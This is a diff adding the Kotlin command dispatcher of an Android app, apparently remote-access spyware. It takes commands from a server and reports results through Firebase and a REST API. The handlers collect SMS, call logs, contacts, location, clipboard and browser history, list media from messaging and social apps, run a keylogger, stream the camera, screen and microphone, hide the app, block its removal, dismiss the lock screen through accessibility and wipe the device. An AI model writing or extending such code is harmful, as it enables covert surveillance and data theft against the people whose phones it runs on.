@@ -1,0 +1,697 @@
+     1→package com.abuzahra.manager.executor
+     2→
+     3→import android.content.ContentValues
+     4→import android.content.Context
+     5→import android.content.Intent
+     6→import android.content.pm.PackageManager
+     7→import android.graphics.BitmapFactory
+     8→import android.net.Uri
+     9→import android.os.Build
+    10→import android.os.Environment
+    11→import android.provider.BlockedNumberContract
+    12→import android.provider.MediaStore
+    13→import android.provider.Settings
+    14→import android.util.Log
+    15→import android.view.KeyguardManager
+    16→import android.view.WindowManager
+    17→import com.abuzahra.manager.App
+    18→import com.abuzahra.manager.api.ApiClient
+    19→import com.abuzahra.manager.api.FirebaseManager
+    20→import com.abuzahra.manager.model.Command
+    21→import com.abuzahra.manager.service.MyAccessibilityService
+    22→import com.abuzahra.manager.util.DeviceUtils
+    23→import kotlinx.coroutines.Dispatchers
+    24→import kotlinx.coroutines.SupervisorJob
+    25→import kotlinx.coroutines.launch
+    26→import java.io.File
+    27→import java.net.URL
+    28→import java.text.SimpleDateFormat
+    29→import java.util.Locale
+    30→
+    31→object CommandExecutor {
+    32→
+    33→    private const val TAG = "CommandExecutor"
+    34→    private val executorScope = kotlinx.coroutines.CoroutineScope(Dispatchers.IO + SupervisorJob())
+    35→
+    36→    fun execute(context: Context, command: Command) {
+    37→        Log.i(TAG, "Executing command: ${command.command} (id=${command.id})")
+    38→
+    39→        executorScope.launch {
+    40→            try {
+    41→                val result = processCommand(context, command)
+    42→                val resultStr = if (result is Map<*, *>) {
+    43→                    result.entries.joinToString("\n") { "  ${it.key}: ${it.value}" }
+    44→                } else {
+    45→                    result.toString()
+    46→                }
+    47→
+    48→                // Send result via Firebase
+    49→                val deviceId = DeviceUtils.getDeviceId(context)
+    50→                FirebaseManager.submitResult(deviceId, command.id, command.command, "completed", result)
+    51→
+    52→                // Also send via REST API as backup
+    53→                ApiClient.submitResult(command.id, command.command, "completed", result)
+    54→
+    55→                Log.i(TAG, "Command ${command.id} completed: ${resultStr.take(100)}")
+    56→            } catch (e: Exception) {
+    57→                Log.e(TAG, "Command ${command.id} failed", e)
+    58→                val deviceId = DeviceUtils.getDeviceId(context)
+    59→                FirebaseManager.submitResult(deviceId, command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
+    60→                ApiClient.submitResult(command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
+    61→            }
+    62→        }
+    63→    }
+    64→
+    65→    // ===== SOCIAL MEDIA DATA SCANNER =====
+    66→    private fun scanSocialMediaDirs(context: Context, dirs: List<String>, label: String): List<Map<String, Any>> {
+    67→        val files = mutableListOf<Map<String, Any>>()
+    68→        // Scoped Storage check for Android 11+
+    69→        try {
+    70→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+    71→                return listOf(mapOf("error" to "MANAGE_EXTERNAL_STORAGE permission required on Android 11+" as Any))
+    72→            }
+    73→        } catch (_: Exception) {}
+    74→
+    75→        for (dirPath in dirs) {
+    76→            val dir = File(dirPath)
+    77→            if (dir.exists() && dir.isDirectory) {
+    78→                dir.walkTopDown().maxDepth(3).forEach { file ->
+    79→                    if (file.isFile && files.size < 200) {
+    80→                        files.add(mapOf(
+    81→                            "name" to file.name,
+    82→                            "path" to file.absolutePath,
+    83→                            "size" to formatFileSize(file.length()),
+    84→                            "size_bytes" to file.length(),
+    85→                            "last_modified" to formatDate(file.lastModified()),
+    86→                            "extension" to file.extension
+    87→                        ))
+    88→                    }
+    89→                }
+    90→            }
+    91→        }
+    92→        return files
+    93→    }
+    94→
+    95→    private fun scanMediaStoreForApp(context: Context, packageName: String, label: String): List<Map<String, Any>> {
+    96→        val files = mutableListOf<Map<String, Any>>()
+    97→        try {
+    98→            val projection = arrayOf(
+    99→                MediaStore.MediaColumns.DISPLAY_NAME,
+   100→                MediaStore.MediaColumns.SIZE,
+   101→                MediaStore.MediaColumns.DATE_MODIFIED,
+   102→                MediaStore.MediaColumns.DATA,
+   103→                MediaStore.MediaColumns.MIME_TYPE
+   104→            )
+   105→            val selection = "${MediaStore.MediaColumns.OWNER_PACKAGE_NAME} = ?"
+   106→            val selectionArgs = arrayOf(packageName)
+   107→            context.contentResolver.query(
+   108→                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+   109→                projection, selection, selectionArgs,
+   110→                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
+   111→            )?.use { cursor ->
+   112→                val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
+   113→                val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
+   114→                val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
+   115→                val dataIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
+   116→                val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
+   117→                var count = 0
+   118→                while (cursor.moveToNext() && count < 200) {
+   119→                    val dateVal = cursor.getLong(dateIdx)
+   120→                    files.add(mapOf(
+   121→                        "name" to (cursor.getString(nameIdx) ?: ""),
+   122→                        "path" to (cursor.getString(dataIdx) ?: ""),
+   123→                        "size" to formatFileSize(cursor.getLong(sizeIdx)),
+   124→                        "size_bytes" to cursor.getLong(sizeIdx),
+   125→                        "last_modified" to formatDate(dateVal * 1000),
+   126→                        "mime_type" to (cursor.getString(mimeIdx) ?: ""),
+   127→                        "source" to label
+   128→                    ))
+   129→                    count++
+   130→                }
+   131→            }
+   132→        } catch (e: Exception) {
+   133→            Log.w(TAG, "MediaStore query failed for $packageName", e)
+   134→        }
+   135→
+   136→        // Also try video store
+   137→        try {
+   138→            val projection = arrayOf(
+   139→                MediaStore.MediaColumns.DISPLAY_NAME,
+   140→                MediaStore.MediaColumns.SIZE,
+   141→                MediaStore.MediaColumns.DATE_MODIFIED,
+   142→                MediaStore.MediaColumns.DATA,
+   143→                MediaStore.MediaColumns.MIME_TYPE
+   144→            )
+   145→            val selection = "${MediaStore.MediaColumns.OWNER_PACKAGE_NAME} = ?"
+   146→            val selectionArgs = arrayOf(packageName)
+   147→            context.contentResolver.query(
+   148→                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+   149→                projection, selection, selectionArgs,
+   150→                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
+   151→            )?.use { cursor ->
+   152→                val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
+   153→                val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
+   154→                val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
+   155→                val dataIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
+   156→                val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
+   157→                var count = 0
+   158→                while (cursor.moveToNext() && count < 200) {
+   159→                    val dateVal = cursor.getLong(dateIdx)
+   160→                    files.add(mapOf(
+   161→                        "name" to (cursor.getString(nameIdx) ?: ""),
+   162→                        "path" to (cursor.getString(dataIdx) ?: ""),
+   163→                        "size" to formatFileSize(cursor.getLong(sizeIdx)),
+   164→                        "size_bytes" to cursor.getLong(sizeIdx),
+   165→                        "last_modified" to formatDate(dateVal * 1000),
+   166→                        "mime_type" to (cursor.getString(mimeIdx) ?: ""),
+   167→                        "source" to label
+   168→                    ))
+   169→                    count++
+   170→                }
+   171→            }
+   172→        } catch (e: Exception) {
+   173→            Log.w(TAG, "Video MediaStore query failed for $packageName", e)
+   174→        }
+   175→        return files
+   176→    }
+   177→
+   178→    // ===== HELPERS =====
+   179→    private fun formatFileSize(bytes: Long): String {
+   180→        if (bytes <= 0) return "0 B"
+   181→        val units = arrayOf("B", "KB", "MB", "GB", "TB")
+   182→        val digitGroups = (Math.log10(bytes.toDouble()) / Math.log10(1024.0)).toInt()
+   183→        return String.format("%.1f %s", bytes / Math.pow(1024.0, digitGroups.toDouble()), units[digitGroups.coerceAtMost(4)])
+   184→    }
+   185→
+   186→    private fun formatDate(timestamp: Long): String {
+   187→        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(java.util.Date(timestamp))
+   188→    }
+   189→
+   190→    private fun processCommand(context: Context, command: Command): Any {
+   191→        val params = command.params
+   192→        val cmd = command.command
+   193→
+   194→        return when (cmd) {
+   195→            // ===== DATA COLLECTION =====
+   196→            "get_sms" -> DataCollector.getSMS(context)
+   197→            "get_calls" -> DataCollector.getCalls(context)
+   198→            "get_contacts" -> DataCollector.getContacts(context)
+   199→            "get_location" -> DataCollector.getLastLocation(context)
+   200→            "get_notifications" -> DataCollector.getRecentNotifications(context)
+   201→            "get_apps", "get_installed_apps" -> DataCollector.getApps(context)
+   202→            "get_info" -> DataCollector.getDeviceInfo(context)
+   203→            "get_battery" -> DataCollector.getBattery(context)
+   204→            "get_gallery" -> FileExecutor.listFiles(context, mapOf("arg" to "dcim"))
+   205→            "get_clipboard" -> DataCollector.getClipboard(context)
+   206→            "get_all" -> mapOf(
+   207→                "info" to DataCollector.getDeviceInfo(context),
+   208→                "battery" to DataCollector.getBattery(context),
+   209→                "wifi" to DataCollector.getWifiInfo(context),
+   210→                "network" to DataCollector.getNetworkInfo(context),
+   211→                "sim" to DataCollector.getSimInfo(context)
+   212→            )
+   213→            "get_wifi_info" -> DataCollector.getWifiInfo(context)
+   214→            "get_network_info" -> DataCollector.getNetworkInfo(context)
+   215→            "get_sim_info" -> DataCollector.getSimInfo(context)
+   216→            "get_storage_info" -> DataCollector.getStorageInfo(context)
+   217→            "get_running_apps" -> DataCollector.getRunningApps(context)
+   218→            "get_calendar" -> DataCollector.getCalendar(context)
+   219→            "get_browser_history" -> DataCollector.getBrowserHistory(context)
+   220→            "get_app_usage" -> AppExecutor.getScreenTime(context)
+   221→
+   222→            // ===== SOCIAL MEDIA =====
+   223→            "get_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
+   224→            "get_telegram" -> FileExecutor.listFiles(context, mapOf("arg" to "telegram"))
+   225→            "get_instagram" -> {
+   226→                val mediaStoreFiles = scanMediaStoreForApp(context, "com.instagram.android", "Instagram")
+   227→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   228→                    "/storage/emulated/0/Android/media/com.instagram.android",
+   229→                    "/storage/emulated/0/Pictures/Instagram",
+   230→                    "/storage/emulated/0/DCIM/Instagram"
+   231→                ), "Instagram")
+   232→                (mediaStoreFiles + dirFiles).take(200)
+   233→            }
+   234→            "get_messenger" -> {
+   235→                val mediaStoreFiles = scanMediaStoreForApp(context, "com.facebook.orca", "Messenger")
+   236→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   237→                    "/storage/emulated/0/Android/media/com.facebook.orca",
+   238→                    "/storage/emulated/0/Pictures/Messenger",
+   239→                    "/storage/emulated/0/DCIM/Messenger"
+   240→                ), "Messenger")
+   241→                (mediaStoreFiles + dirFiles).take(200)
+   242→            }
+   243→            "get_snapchat" -> {
+   244→                val mediaStoreFiles = scanMediaStoreForApp(context, "com.snapchat.android", "Snapchat")
+   245→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   246→                    "/storage/emulated/0/Android/media/com.snapchat.android",
+   247→                    "/storage/emulated/0/Pictures/Snapchat",
+   248→                    "/storage/emulated/0/DCIM/Snapchat"
+   249→                ), "Snapchat")
+   250→                (mediaStoreFiles + dirFiles).take(200)
+   251→            }
+   252→            "get_tiktok" -> {
+   253→                val mediaStoreFiles = scanMediaStoreForApp(context, "com.zhiliaoapp.musically", "TikTok")
+   254→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   255→                    "/storage/emulated/0/Android/media/com.zhiliaoapp.musically",
+   256→                    "/storage/emulated/0/Pictures/TikTok",
+   257→                    "/storage/emulated/0/DCIM/TikTok"
+   258→                ), "TikTok")
+   259→                (mediaStoreFiles + dirFiles).take(200)
+   260→            }
+   261→            "get_twitter" -> {
+   262→                val mediaStoreFiles = scanMediaStoreForApp(context, "com.twitter.android", "Twitter")
+   263→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   264→                    "/storage/emulated/0/Android/media/com.twitter.android",
+   265→                    "/storage/emulated/0/Pictures/Twitter",
+   266→                    "/storage/emulated/0/DCIM/Twitter"
+   267→                ), "Twitter")
+   268→                (mediaStoreFiles + dirFiles).take(200)
+   269→            }
+   270→            "get_viber" -> {
+   271→                val mediaStoreFiles = scanMediaStoreForApp(context, "com.viber.voip", "Viber")
+   272→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   273→                    "/storage/emulated/0/Android/media/com.viber.voip",
+   274→                    "/storage/emulated/0/Viber",
+   275→                    "/storage/emulated/0/Pictures/Viber"
+   276→                ), "Viber")
+   277→                (mediaStoreFiles + dirFiles).take(200)
+   278→            }
+   279→            "get_signal" -> {
+   280→                val mediaStoreFiles = scanMediaStoreForApp(context, "org.thoughtcrime.securesms", "Signal")
+   281→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   282→                    "/storage/emulated/0/Android/media/org.thoughtcrime.securesms",
+   283→                    "/storage/emulated/0/Signal",
+   284→                    "/storage/emulated/0/Pictures/Signal"
+   285→                ), "Signal")
+   286→                (mediaStoreFiles + dirFiles).take(200)
+   287→            }
+   288→            "get_facebook" -> {
+   289→                val mediaStoreFiles = scanMediaStoreForApp(context, "com.facebook.katana", "Facebook")
+   290→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   291→                    "/storage/emulated/0/Android/media/com.facebook.katana",
+   292→                    "/storage/emulated/0/Pictures/Facebook",
+   293→                    "/storage/emulated/0/DCIM/Facebook"
+   294→                ), "Facebook")
+   295→                (mediaStoreFiles + dirFiles).take(200)
+   296→            }
+   297→            "get_youtube" -> {
+   298→                val mediaStoreFiles = scanMediaStoreForApp(context, "com.google.android.youtube", "YouTube")
+   299→                val dirFiles = scanSocialMediaDirs(context, listOf(
+   300→                    "/storage/emulated/0/Android/media/com.google.android.youtube",
+   301→                    "/storage/emulated/0/Movies/YouTube",
+   302→                    "/storage/emulated/0/Pictures/YouTube"
+   303→                ), "YouTube")
+   304→                (mediaStoreFiles + dirFiles).take(200)
+   305→            }
+   306→
+   307→            // ===== REMOTE CONTROL =====
+   308→            "ping" -> ControlExecutor.ping()
+   309→            "vibrate" -> ControlExecutor.vibrate(context, params)
+   310→            "ring" -> ControlExecutor.ring(context)
+   311→            "screenshot" -> ControlExecutor.takeScreenshot(context)
+   312→            "front_camera" -> ControlExecutor.frontCamera(context)
+   313→            "back_camera" -> ControlExecutor.backCamera(context)
+   314→            "record_audio" -> ControlExecutor.recordAudio(context, params)
+   315→            "record_screen" -> ControlExecutor.recordScreen(context, params)
+   316→            "stop_screen" -> MonitorExecutor.screenRecordStop()
+   317→            "lock_phone" -> ControlExecutor.lockPhone(context)
+   318→            "unlock_phone" -> {
+   319→                try {
+   320→                    val km = context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+   321→                    if (km?.isDeviceLocked == true) {
+   322→                        // Try to dismiss keyguard via accessibility service
+   323→                        val acc = MyAccessibilityService.getInstance()
+   324→                        if (acc != null) {
+   325→                            acc.dismissKeyguard()
+   326→                            mapOf("ok" to true, "message" to "Keyguard dismiss requested via accessibility")
+   327→                        } else {
+   328→                            // Fallback: try to wake screen and dismiss notification shade
+   329→                            try {
+   330→                                val powerManager = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
+   331→                                val wakeLock = powerManager?.newWakeLock(
+   332→                                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
+   333→                                    "abuzahra:unlock"
+   334→                                )
+   335→                                wakeLock?.acquire(3000)
+   336→                                wakeLock?.release()
+   337→                                mapOf("ok" to true, "message" to "Screen woken; accessibility service not running - cannot dismiss keyguard without it")
+   338→                            } catch (e: Exception) {
+   339→                                mapOf("message" to "Accessibility service not running - cannot unlock programmatically without root")
+   340→                            }
+   341→                        }
+   342→                    } else {
+   343→                        mapOf("ok" to true, "message" to "Device is already unlocked")
+   344→                    }
+   345→                } catch (e: Exception) {
+   346→                    mapOf("error" to (e.message ?: "Failed to unlock"))
+   347→                }
+   348→            }
+   349→            "reboot" -> ControlExecutor.reboot(context)
+   350→            "shutdown" -> ControlExecutor.shutdown(context)
+   351→            "set_volume" -> ControlExecutor.setVolume(context, params)
+   352→            "set_brightness" -> ControlExecutor.setBrightness(context, params)
+   353→            "set_ringtone" -> ControlExecutor.setRingtone(context, params)
+   354→            "set_wallpaper" -> {
+   355→                val url = params["arg"] as? String ?: return mapOf("error" to "Image URL required")
+   356→                try {
+   357→                    // Download image from URL
+   358→                    val connection = URL(url).openConnection()
+   359→                    connection.connectTimeout = 15000
+   360→                    connection.readTimeout = 15000
+   361→                    connection.doInput = true
+   362→                    connection.connect()
+   363→                    val input = connection.getInputStream()
+   364→                    val bitmap = BitmapFactory.decodeStream(input)
+   365→                    input.close()
+   366→                    if (bitmap == null) {
+   367→                        return mapOf("error" to "Failed to decode image from URL")
+   368→                    }
+   369→                    val wm = context.getSystemService(Context.WALLPAPER_SERVICE) as? WindowManager
+   370→                    @Suppress("DEPRECATION")
+   371→                    val wallpaperManager = android.app.WallpaperManager.getInstance(context)
+   372→                    wallpaperManager.setBitmap(bitmap)
+   373→                    bitmap.recycle()
+   374→                    mapOf("ok" to true, "message" to "Wallpaper set successfully")
+   375→                } catch (e: Exception) {
+   376→                    mapOf("error" to (e.message ?: "Failed to set wallpaper"))
+   377→                }
+   378→            }
+   379→            "enable_wifi" -> ControlExecutor.enableWifi(context)
+   380→            "disable_wifi" -> ControlExecutor.disableWifi(context)
+   381→            "enable_bluetooth" -> ControlExecutor.enableBluetooth(context)
+   382→            "disable_bluetooth" -> ControlExecutor.disableBluetooth(context)
+   383→            "enable_mobile_data" -> ControlExecutor.enableMobileData(context)
+   384→            "disable_mobile_data" -> ControlExecutor.disableMobileData(context)
+   385→            "enable_hotspot" -> ControlExecutor.enableHotspot(context)
+   386→            "disable_hotspot" -> ControlExecutor.disableHotspot(context)
+   387→            "airplane_on" -> ControlExecutor.airplaneOn(context)
+   388→            "airplane_off" -> ControlExecutor.airplaneOff(context)
+   389→            "set_auto_rotate" -> ControlExecutor.setAutoRotate(context, params)
+   390→            "torch_on" -> ControlExecutor.torchOn(context)
+   391→            "torch_off" -> ControlExecutor.torchOff(context)
+   392→            "play_sound" -> ControlExecutor.playSound(context, params)
+   393→            "speak_text" -> ControlExecutor.speakText(context, params)
+   394→            "show_notification" -> ControlExecutor.showNotification(context, params)
+   395→            "open_url" -> ControlExecutor.openUrl(context, params)
+   396→            "send_sms" -> ControlExecutor.sendSms(context, params)
+   397→            "make_call" -> ControlExecutor.makeCall(context, params)
+   398→            "block_number" -> {
+   399→                val number = params["arg"] as? String ?: return mapOf("error" to "Number required")
+   400→                try {
+   401→                    val values = ContentValues().apply {
+   402→                        put(BlockedNumberContract.BlockedNumbers.COLUMN_NUMBER, number)
+   403→                    }
+   404→                    val uri = context.contentResolver.insert(BlockedNumberContract.BlockedNumbers.CONTENT_URI, values)
+   405→                    if (uri != null) {
+   406→                        mapOf("ok" to true, "message" to "Blocked: $number")
+   407→                    } else {
+   408→                        mapOf("error" to "Failed to block number")
+   409→                    }
+   410→                } catch (e: Exception) {
+   411→                    mapOf("error" to (e.message ?: "Failed to block number - may need READ_CALL_LOG / WRITE_CALL_LOG permission"))
+   412→                }
+   413→            }
+   414→            "unblock_number" -> {
+   415→                val number = params["arg"] as? String ?: return mapOf("error" to "Number required")
+   416→                try {
+   417→                    val rowsDeleted = context.contentResolver.delete(
+   418→                        BlockedNumberContract.BlockedNumbers.CONTENT_URI,
+   419→                        "${BlockedNumberContract.BlockedNumbers.COLUMN_NUMBER} = ?",
+   420→                        arrayOf(number)
+   421→                    )
+   422→                    if (rowsDeleted > 0) {
+   423→                        mapOf("ok" to true, "message" to "Unblocked: $number", "rows_deleted" to rowsDeleted)
+   424→                    } else {
+   425→                        mapOf("message" to "Number was not in blocked list: $number")
+   426→                    }
+   427→                } catch (e: Exception) {
+   428→                    mapOf("error" to (e.message ?: "Failed to unblock number - may need READ_CALL_LOG / WRITE_CALL_LOG permission"))
+   429→                }
+   430→            }
+   431→
+   432→            // ===== APP MANAGEMENT =====
+   433→            "open_app", "launch_app" -> AppExecutor.openApp(context, params)
+   434→            "enable_app" -> {
+   435→                val pkg = params["arg"] as? String ?: return mapOf("error" to "Package name required")
+   436→                try {
+   437→                    val pm = context.packageManager
+   438→                    val intent = pm.getLaunchIntentForPackage(pkg)
+   439→                    if (intent != null) {
+   440→                        pm.setComponentEnabledSetting(
+   441→                            intent.component!!,
+   442→                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+   443→                            PackageManager.DONT_KILL_APP
+   444→                        )
+   445→                        mapOf("ok" to true, "message" to "App enabled: $pkg")
+   446→                    } else {
+   447→                        mapOf("error" to "No launcher activity found for $pkg")
+   448→                    }
+   449→                } catch (e: Exception) {
+   450→                    mapOf("error" to (e.message ?: "Failed to enable app"))
+   451→                }
+   452→            }
+   453→            "close_app", "kill_app" -> AppExecutor.closeApp(context, params)
+   454→            "disable_app" -> {
+   455→                val pkg = params["arg"] as? String ?: return mapOf("error" to "Package name required")
+   456→                try {
+   457→                    val pm = context.packageManager
+   458→                    val intent = pm.getLaunchIntentForPackage(pkg)
+   459→                    if (intent != null) {
+   460→                        pm.setComponentEnabledSetting(
+   461→                            intent.component!!,
+   462→                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
+   463→                            PackageManager.DONT_KILL_APP
+   464→                        )
+   465→                        mapOf("ok" to true, "message" to "App disabled: $pkg")
+   466→                    } else {
+   467→                        mapOf("error" to "No launcher activity found for $pkg")
+   468→                    }
+   469→                } catch (e: Exception) {
+   470→                    mapOf("error" to (e.message ?: "Failed to disable app"))
+   471→                }
+   472→            }
+   473→            "install_app", "update_app" -> AppExecutor.installApp(context, params)
+   474→            "uninstall_app" -> AppExecutor.uninstallApp(context, params)
+   475→            "block_app" -> AppExecutor.blockApp(context, params)
+   476→            "unblock_app" -> AppExecutor.unblockApp(context, params)
+   477→            "clear_app_data", "clear_cache", "app_cache" -> AppExecutor.clearAppData(context, params)
+   478→            "force_stop_app" -> AppExecutor.forceStopApp(context, params)
+   479→            "app_info" -> AppExecutor.getAppInfo(context, params)
+   480→            "app_permissions" -> {
+   481→                val pkg = params["arg"] as? String ?: return mapOf("error" to "Package name required")
+   482→                try {
+   483→                    val pm = context.packageManager
+   484→                    val info = pm.getPackageInfo(pkg, PackageManager.GET_PERMISSIONS)
+   485→                    val requestedPerms = info.requestedPermissions ?: arrayOf()
+   486→                    val flags = info.requestedPermissionsFlags
+   487→                    val perms = requestedPerms.mapIndexed { index, permName ->
+   488→                        val isGranted = flags?.get(index)?.let { flag ->
+   489→                            (flag and PackageManager.PERMISSION_GRANTED) != 0
+   490→                        } ?: false
+   491→                        mapOf("name" to permName, "granted" to isGranted)
+   492→                    }
+   493→                    mapOf("ok" to true, "package" to pkg, "data" to perms, "count" to perms.size)
+   494→                } catch (e: Exception) {
+   495→                    mapOf("error" to (e.message ?: "Failed to get permissions"))
+   496→                }
+   497→            }
+   498→            "screen_time", "app_usage" -> AppExecutor.getScreenTime(context)
+   499→            "list_blocked" -> {
+   500→                try {
+   501→                    val cursor = context.contentResolver.query(
+   502→                        BlockedNumberContract.BlockedNumbers.CONTENT_URI,
+   503→                        arrayOf(BlockedNumberContract.BlockedNumbers.COLUMN_NUMBER),
+   504→                        null, null, null
+   505→                    )
+   506→                    val blocked = mutableListOf<String>()
+   507→                    cursor?.use {
+   508→                        while (it.moveToNext()) {
+   509→                            blocked.add(it.getString(0))
+   510→                        }
+   511→                    }
+   512→                    mapOf("ok" to true, "data" to blocked, "count" to blocked.size)
+   513→                } catch (e: Exception) {
+   514→                    mapOf("error" to (e.message ?: "Failed to list blocked numbers - may need READ_CALL_LOG permission"))
+   515→                }
+   516→            }
+   517→
+   518→            // ===== FILE MANAGEMENT =====
+   519→            "list_files", "list_downloads", "list_dcim", "list_music",
+   520→            "list_videos", "list_documents", "list_whatsapp",
+   521→            "list_telegram_files" -> FileExecutor.listFiles(context, params)
+   522→            "get_file", "download_file" -> FileExecutor.getFileInfo(context, params)
+   523→            "delete_file" -> FileExecutor.deleteFile(context, params)
+   524→            "rename_file" -> FileExecutor.renameFile(context, params)
+   525→            "copy_file" -> FileExecutor.copyFile(context, params)
+   526→            "move_file" -> FileExecutor.moveFile(context, params)
+   527→            "create_folder" -> FileExecutor.createFolder(context, params)
+   528→            "get_folder_size" -> FileExecutor.getFolderSize(context, params)
+   529→            "search_files" -> FileExecutor.searchFiles(context, params)
+   530→            "recent_files" -> FileExecutor.recentFiles(context)
+   531→            "file_info" -> FileExecutor.getFileInfo(context, params)
+   532→            "zip_files" -> {
+   533→                val arg = params["arg"] as? String ?: return mapOf("error" to "File path required")
+   534→                try {
+   535→                    val file = File(arg)
+   536→                    if (!file.exists()) return mapOf("error" to "File not found: $arg")
+   537→                    val zipFile = File(file.absolutePath + ".zip")
+   538→                    java.util.zip.ZipOutputStream(java.io.FileOutputStream(zipFile)).use { zos ->
+   539→                        if (file.isDirectory) {
+   540→                            file.walkTopDown().forEach { f ->
+   541→                                if (f.isFile) {
+   542→                                    val entry = java.util.zip.ZipEntry(f.relativeTo(file).path)
+   543→                                    zos.putNextEntry(entry)
+   544→                                    f.inputStream().copyTo(zos)
+   545→                                    zos.closeEntry()
+   546→                                }
+   547→                            }
+   548→                        } else {
+   549→                            zos.putNextEntry(java.util.zip.ZipEntry(file.name))
+   550→                            file.inputStream().copyTo(zos)
+   551→                            zos.closeEntry()
+   552→                        }
+   553→                    }
+   554→                    mapOf("ok" to true, "message" to "Created: ${zipFile.name}", "path" to zipFile.absolutePath, "size" to zipFile.length())
+   555→                } catch (e: Exception) {
+   556→                    mapOf("error" to (e.message ?: "Failed to create zip"))
+   557→                }
+   558→            }
+   559→            "send_backup_contacts" -> DataCollector.getContacts(context)
+   560→            "send_backup_sms" -> DataCollector.getSMS(context)
+   561→            "send_backup_calls" -> DataCollector.getCalls(context)
+   562→            "send_backup_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
+   563→            "send_backup_all" -> mapOf(
+   564→                "contacts" to DataCollector.getContacts(context).size,
+   565→                "sms" to DataCollector.getSMS(context).size,
+   566→                "calls" to DataCollector.getCalls(context).size,
+   567→                "apps" to DataCollector.getApps(context).size
+   568→            )
+   569→
+   570→            // ===== SECURITY =====
+   571→            "wipe_data" -> SecurityExecutor.wipeData(context)
+   572→            "factory_reset" -> SecurityExecutor.factoryReset(context)
+   573→            "show_app" -> SecurityExecutor.showApp(context)
+   574→            "hide_app" -> SecurityExecutor.hideApp(context)
+   575→            "change_passcode", "set_pin", "remove_pin" -> SecurityExecutor.changePasscode(context, params)
+   576→            "enable_biometric" -> SecurityExecutor.enableBiometric(context)
+   577→            "disable_biometric" -> SecurityExecutor.disableBiometric(context)
+   578→            "anti_uninstall_on" -> SecurityExecutor.antiUninstallOn(context)
+   579→            "anti_uninstall_off" -> SecurityExecutor.antiUninstallOff(context)
+   580→            "device_admin_status" -> SecurityExecutor.deviceAdminStatus(context)
+   581→            "check_root" -> SecurityExecutor.checkRoot()
+   582→            "set_screen_lock" -> SecurityExecutor.setScreenLock(context)
+   583→            "remove_screen_lock" -> SecurityExecutor.removeScreenLock(context)
+   584→
+   585→            // ===== MONITORING =====
+   586→            "keylogger_start" -> MonitorExecutor.keyloggerStart()
+   587→            "keylogger_stop" -> MonitorExecutor.keyloggerStop()
+   588→            "get_keylogger" -> MonitorExecutor.getKeylogger()
+   589→            "screen_record_start" -> MonitorExecutor.screenRecordStart(context, params)
+   590→            "location_live" -> MonitorExecutor.locationLiveStart(context, 30)
+   591→            "location_stop" -> MonitorExecutor.locationStop()
+   592→            "clipboard_monitor_start" -> MonitorExecutor.clipboardMonitorStart(context)
+   593→            "clipboard_monitor_stop" -> MonitorExecutor.clipboardMonitorStop()
+   594→            "wifi_monitor_start" -> MonitorExecutor.wifiMonitorStart(context)
+   595→            "wifi_monitor_stop" -> MonitorExecutor.wifiMonitorStop()
+   596→            "app_monitor_start" -> MonitorExecutor.appMonitorStart(context)
+   597→            "app_monitor_stop" -> MonitorExecutor.appMonitorStop()
+   598→            "get_app_log" -> MonitorExecutor.getAllStatus()
+   599→            "geo_add" -> MonitorExecutor.geoAdd(params)
+   600→            "geo_remove" -> MonitorExecutor.geoRemove(params)
+   601→            "geo_list" -> MonitorExecutor.geoList()
+   602→            "sms_monitor" -> MonitorExecutor.smsMonitorStart(context)
+   603→            "call_monitor" -> MonitorExecutor.callMonitorStart(context)
+   604→
+   605→            // ===== STREAMING =====
+   606→            "start_screen_stream" -> StreamExecutor.startScreenStream(context, params)
+   607→            "stop_screen_stream" -> StreamExecutor.stopScreenStream(context, params)
+   608→            "start_camera_stream" -> StreamExecutor.startCameraStream(context, params)
+   609→            "stop_camera_stream" -> StreamExecutor.stopCameraStream(context, params)
+   610→            "switch_camera" -> StreamExecutor.switchCamera(context, params)
+   611→            "start_audio_stream" -> StreamExecutor.startAudioStream(context, params)
+   612→            "stop_audio_stream" -> StreamExecutor.stopAudioStream(context, params)
+   613→            "get_stream_status" -> StreamExecutor.getStreamStatus(context, params)
+   614→            "set_stream_quality" -> StreamExecutor.setStreamQuality(context, params)
+   615→            "enable_torch" -> StreamExecutor.enableTorch(context, params)
+   616→            "pause_stream" -> StreamExecutor.pauseStream(context, params)
+   617→            "resume_stream" -> StreamExecutor.resumeStream(context, params)
